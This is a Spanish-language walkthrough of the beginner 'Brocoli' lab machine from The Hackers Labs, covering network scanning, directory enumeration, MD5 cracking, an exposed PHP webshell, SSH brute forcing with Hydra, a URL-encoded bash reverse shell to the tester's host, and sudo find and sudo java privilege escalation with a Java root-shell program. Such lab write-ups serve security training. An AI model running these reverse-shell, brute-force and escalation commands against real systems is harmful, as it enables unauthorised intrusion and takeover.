---
Estado: Completado
Plataforma: The Hackers Labs
SO: Linux
Dificultad: Principiante
VectorInicial: Webshell expuesta en uploads
ServicioInicial: HTTP
PuertoInicial: 80
Credenciales:
 - brocoli: megustalafruta
Usuarios:
 - www-data
 - brocoli
 - brocolon
 - root
Privesc:
 - sudo find
 - sudo java
Tecnicas:
 - Network Discovery
 - Directory Enumeration
 - Directory Listing
 - Webshell Discovery
 - Command Execution
 - Reverse Shell
 - Credential Discovery
 - User Pivoting
 - Privilege Escalation
Herramientas:
 - arp-scan
 - gomap
 - gobuster
 - hashcat
 - hydra
 - penelope
Fecha: 2026-03-10
---
<img width="1024" height="1024" alt="Pasted image 20260310082813" src="https://github.com/user-attachments/assets/a623b2dc-f6a2-47a7-9820-f6ec76a9e05b" />

Vamos a empezar con un reconocimiento de la red para saber la *IP* de la maquina.

```bash
 sudo arp-scan -I eth0 --localnet                                  

Interface: eth0, type: EN10MB, MAC: 08:00:27:62:44:c6, IPv4: 10.0.11.11
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.11.1	52:55:0a:00:0b:01	(Unknown: locally administered)
10.0.11.2	08:00:27:94:2a:7a	(Unknown)
10.0.11.15	08:00:27:06:e0:1d	(Unknown)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.947 seconds (131.48 hosts/sec). 3 responded
```

Observamos que la *IP* de la maquina objetivo es la *10.0.11.15* así que empezaremos con la enumeración de puertos.

```bash
 settarget 10.0.11.15            
TARGET establecido: 10.0.11.15

 gomap $TARGET

  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██████╗ 
 ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔══██╗
 ██║  ███╗██║   ██║██╔████╔██║███████║██████╔╝
 ██║   ██║██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ 
 ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     
  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝

🎯 Scanning 10.0.11.15 (996 ports, CONNECT scan)

PORT    STATE 
22      open  
80      open  

Host Exposure Summary
- 10.0.11.15 | open ports: 2 | critical: ssh | exposure: medium

✓ Completed scan in 59ms | hosts: 1 | open ports: 2

 gomap -s -p 22,80 $TARGET

  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██████╗ 
 ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔══██╗
 ██║  ███╗██║   ██║██╔████╔██║███████║██████╔╝
 ██║   ██║██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ 
 ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     
  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝

🎯 Scanning 10.0.11.15 (2 ports, CONNECT scan)

PORT    STATE  SERVICE         VERSION
22      open   ssh             SSH-2.0 - OpenSSH 9.6p1 Ubuntu-3ubuntu13.13
80      open   http            Apache 2.4.58 (Ubuntu)

Host Exposure Summary
- 10.0.11.15 | open ports: 2 | critical: ssh | exposure: medium

✓ Completed scan in 10ms | hosts: 1 | open ports: 2
```

Tenemos 2 puertos abiertos:
- 22 para conexión por *SSH*
- 80 para paginas web por *HTTP*

Veamos que podemos ver en la web.

Pero solo tenemos la pagina por defecto de *Apache* con los logos de *Ubuntu*.

Pasemos a enumerar las carpetas a ver que encontramos.

```bash
 gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.11.15/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 10718]
uploads              (Status: 301) [Size: 310] [--> http://10.0.11.15/uploads/]
server-status        (Status: 403) [Size: 275]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

Parece que solo tenemos una vía de estudio y es la carpeta **uploads**, veamos que tiene.

```http
Index of /uploads
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	-	 
[   ]	brocoli.php	2025-12-27 13:18	31	 
[TXT]	informebrocoli.txt	2025-12-27 13:16	33	 
Apache/2.4.58 (Ubuntu) Server at 10.0.11.15 Port 80
```

Parece que tenemos un fichero *PHP* y un *TXT*, veamos que podemos sacar.

En el fichero *TXT* nos encontramos con un texto y parece estar codificado `913026c7754df0fbdc89b75007ad5a66` así que vamos a ver que nos dice.

```bash
 hashcat -m 0 informebrocoli.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i5-14400F, 2948/5897 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (3059 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

913026c7754df0fbdc89b75007ad5a66:mecmec                   
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 913026c7754df0fbdc89b75007ad5a66
Time.Started.....: Tue Mar 10 09:41:03 2026 (0 secs)
Time.Estimated...: Tue Mar 10 09:41:03 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   871.1 kH/s (0.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 40960/14344385 (0.29%)
Rejected.........: 0/40960 (0.00%)
Restore.Point....: 36864/14344385 (0.26%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: holabebe -> loserface1
Hardware.Mon.#01.: Util:  3%

Started: Tue Mar 10 09:40:47 2026
Stopped: Tue Mar 10 09:41:04 2026
```

Con este decode obtenemos una contraseña que puede ser para un usuario llamado `brocoli` con una contraseña `informebrocoli`, pero hay algo que me llama la atención y es el fichero `brocoli.php`.

```http
http://10.0.11.15/uploads/brocoli.php?cmd=cat+/etc/passwd
```

Y como no, es un fichero que nos permite tener una **Web Shell** para poder encontrar el fichero `/etc/passwd` y ver los usuarios.

```bash
|root:x:0:0:root:/root:/bin/bash|
|daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin|
|bin:x:2:2:bin:/bin:/usr/sbin/nologin|
|sys:x:3:3:sys:/dev:/usr/sbin/nologin|
|sync:x:4:65534:sync:/bin:/bin/sync|
|games:x:5:60:games:/usr/games:/usr/sbin/nologin|
|man:x:6:12:man:/var/cache/man:/usr/sbin/nologin|
|lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin|
|mail:x:8:8:mail:/var/mail:/usr/sbin/nologin|
|news:x:9:9:news:/var/spool/news:/usr/sbin/nologin|
|uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin|
|proxy:x:13:13:proxy:/bin:/usr/sbin/nologin|
|www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin|
|backup:x:34:34:backup:/var/backups:/usr/sbin/nologin|
|list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin|
|irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin|
|_apt:x:42:65534::/nonexistent:/usr/sbin/nologin|
|nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin|
|systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin|
|systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin|
|dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false|
|messagebus:x:101:102::/nonexistent:/usr/sbin/nologin|
|systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin|
|pollinate:x:102:1::/var/cache/pollinate:/bin/false|
|polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin|
|syslog:x:103:104::/nonexistent:/usr/sbin/nologin|
|uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin|
|tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin|
|tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false|
|landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin|
|fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin|
|usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin|
|sshd:x:109:65534::/run/sshd:/usr/sbin/nologin|
|brocolon:x:1000:1000:brocolon:/home/brocolon:/bin/bash|
|brocoli:x:1001:1001:brocoli,,,:/home/brocoli:/bin/bash|
|mysql:x:110:111:MySQL Server,,,:/nonexistent:/bin/false|
```

Podemos ver usuarios interesantes:
- root
- brocolon
- brocoli

Con los usuarios en mano y la contraseña que obtuvimos antes ya podemos intentar acceder por *SSH* a la maquina objetivo.

```bash
 ssh brocolon@$TARGET
The authenticity of host '10.0.11.15 (10.0.11.15)' can't be established.
ED25519 key fingerprint is: SHA256:XWxwWSXa6jC3DpvVZr2yRGiHhJbzOik05soJHdORKLQ
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.11.15' (ED25519) to the list of known hosts.
brocolon@10.0.11.15's password: 
Permission denied, please try again.
brocolon@10.0.11.15's password: 

 ssh brocoli@$TARGET 
brocoli@10.0.11.15's password: 
Permission denied, please try again.
brocoli@10.0.11.15's password: 

 ssh root@$TARGET   
root@10.0.11.15's password: 
Permission denied, please try again.
root@10.0.11.15's password: 
```

Parece que la contraseña `mecmec` no ha servido, puede que sea solo una referencia al *corre caminos* de los dibujos animados.

Por este motivo usaremos **Hydra** contra *SSH*.

```bash
 hydra -l brocoli -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
 hydra -l brocolon -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
 hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
```

Pero ninguna funciono, así que usaremos el `Web Shell` para generar una `Revershell` y poder conectar como el usuario *www-data* y desde hay ir pivotando y escalando privilegios.

```http
http://10.0.11.15/uploads/brocoli.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.0.11.11/443%200%3E%261%27
```

Con este comando codificado en formato *URL* obtenemos la conexión contra nuestra maquina.

```bash
 penelope -p 443
[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 10.0.11.11 • 172.17.0.1
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from TheHackersLabs-Brocoli~10.0.11.15-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/jduran/.penelope/sessions/TheHackersLabs-Brocoli~10.0.11.15-Linux-x86_64/2026_03_10-10_16_49-968.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@TheHackersLabs-Brocoli:/var/www/html/uploads$ ls
brocoli.php  informebrocoli.txt
www-data@TheHackersLabs-Brocoli:/var/www/html/uploads$ ls /opt/
credenciales.txt
www-data@TheHackersLabs-Brocoli:/var/www/html/uploads$ cat /opt/credenciales.txt 

--------------------------------------------------------------------------
Credenciales:
--------------------------------------------------------------------------
[+] Usuario: brocoli 
[+] Contraseña: megustalafruta
--------------------------------------------------------------------------


www-data@TheHackersLabs-Brocoli:/var/www/html/uploads$
```

Parece que ya tenemos el primer `usuario:contraseña` despues de busacar un poco.

Empecemos a indagar y seguir escalando.

```bash
www-data@TheHackersLabs-Brocoli:/var/www/html/uploads$ su brocoli
Password: 
brocoli@TheHackersLabs-Brocoli:/var/www/html/uploads$ cd
brocoli@TheHackersLabs-Brocoli:~$ ls
brocoli@TheHackersLabs-Brocoli:~$ sudo -l
Matching Defaults entries for brocoli on TheHackersLabs-Brocoli:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User brocoli may run the following commands on TheHackersLabs-Brocoli:
    (brocolon) NOPASSWD: /usr/bin/find
brocoli@TheHackersLabs-Brocoli:~$
```

Parece que tenemos el primer pivotin de usuario y ademas tenemos la opción de hacer una escalada a `brocolon` desde el binario **find**.

```bash
brocoli@TheHackersLabs-Brocoli:~$ cd /var/www/html/uploads/
brocoli@TheHackersLabs-Brocoli:/var/www/html/uploads$ sudo -u brocolon find . -exec /bin/sh \; -quit
$ whoami
brocolon
$ /bin/bash
brocolon@TheHackersLabs-Brocoli:/var/www/html/uploads$ 
```

Cabe destacar que nos tuvimos que mover a un directorio donde el usuario `brocolon` tuviese permisos de lectura, en caso contrario el comando de escalada no funciono.

Ahora investiguemos a ver si podemos llegar a ser **root**.

```bash
brocolon@TheHackersLabs-Brocoli:/var/www/html/uploads$ sudo -l
Matching Defaults entries for brocolon on TheHackersLabs-Brocoli:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User brocolon may run the following commands on TheHackersLabs-Brocoli:
    (ALL : ALL) NOPASSWD: /usr/bin/java
```

Parece que podemos ser `root` a través de **java** pero implica un paso mas, primero tenemos que crear un fichero `shell.java` pero esto no seria posible sin un compilador de *java*, pero hay algunas versiones de *java* que realizan un compilado temporal.

```bash
openjdk version "21.0.9" 2025-10-21
OpenJDK Runtime Environment (build 21.0.9+10-Ubuntu-124.04)
OpenJDK 64-Bit Server VM (build 21.0.9+10-Ubuntu-124.04, mixed mode, sharing)
```

Esta versión nos permite realizar esta acción.

El código que usaremos sera el siguiente:

```java
import java.io.*;
public class root {
    public static void main(String[] args) throws Exception {
        Process p = new ProcessBuilder("/bin/bash").inheritIO().start();
        p.waitFor();
    }
}
```

Crearemos el fichero con este código mediante `nano`.

```bash
brocolon@TheHackersLabs-Brocoli:~$ nano shell.java
```

Ahora solo tenemos que ejecutarlo para obtener el acceso como `root`.

```bash
brocolon@TheHackersLabs-Brocoli:~$ sudo java shell.java
root@TheHackersLabs-Brocoli:/home/brocolon# whoami
root
root@TheHackersLabs-Brocoli:/home/brocolon# ls /root/
congrats.txt  root.txt
```

Con esto ya hemos terminado el laboratorio.

Ha sido interesante llegar a escalar los privilegios a través de los distintos usuarios y la posibilidad de tener directamente un `Web Shell`, lo cual es una falla de seguridad.
